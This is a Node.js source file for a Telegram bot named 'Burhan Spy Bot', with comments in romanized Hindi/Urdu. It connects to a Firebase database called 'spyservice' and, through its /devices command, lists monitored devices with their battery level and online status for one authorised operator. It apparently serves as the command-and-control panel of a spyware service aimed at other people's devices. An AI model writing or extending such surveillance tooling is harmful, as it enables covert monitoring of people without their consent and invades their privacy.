const TelegramBot = require('node-telegram-bot-api');
const admin = require('firebase-admin');
const express = require('express');

const token = process.env.TOKEN; // Railway se TOKEN milega
const YOUR_USER_ID = process.env.USER_ID; // Railway se USER_ID milega

const bot = new TelegramBot(token, { polling: false }); // Polling OFF, Webhook use hoga
const app = express();
app.use(express.json());

// Firebase Setup
const serviceAccount = require('./firebase-service-account.json');
admin.initializeApp({
    credential: admin.credential.cert(serviceAccount),
    databaseURL: "https://spyservice-c27e1-default-rtdb.europe-west1.firebasedatabase.app"
});
const db = admin.database();

// ✅ Webhook Receiver (Telegram messages yahan aayenge)
app.post('/webhook', (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

// ✅ Bot Commands
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    bot.sendMessage(chatId, `🔥 Welcome to Burhan Spy Bot! 🔥`);
});

bot.onText(/\/devices/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    db.ref('devices').once('value', (snapshot) => {
        const devices = snapshot.val() || {};
        let message = "📱 ALL DEVICES (Total: " + Object.keys(devices).length + ")\n\n";
        Object.entries(devices).forEach(([id, d]) => {
            message += `🔑 ID: ${id}\n🔋 Battery: ${d.battery}%\n📊 Status: ${d.online ? "🟢 ONLINE" : "🔴 OFFLINE"}\n🕒 ${d.time}\n\n`;
        });
        bot.sendMessage(chatId, message);
    });
});

// Authorization
function isAuthorized(msg) {
    return String(msg.from.id) === String(YOUR_USER_ID);
}

// Server Start
app.listen(3000, () => {
    console.log("Server running on port 3000");
});
